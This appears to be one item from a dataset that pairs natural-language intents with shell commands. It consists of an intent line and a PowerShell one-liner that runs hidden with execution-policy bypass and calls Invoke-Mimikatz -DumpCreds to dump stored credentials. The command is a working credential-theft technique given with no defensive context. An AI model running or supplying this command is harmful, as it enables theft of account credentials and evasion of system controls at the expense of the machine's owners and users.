# Natural language intent:
# Run PowerShell with specific options to execute Mimikatz and dump credentials.

powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Invoke-Mimikatz -DumpCreds}
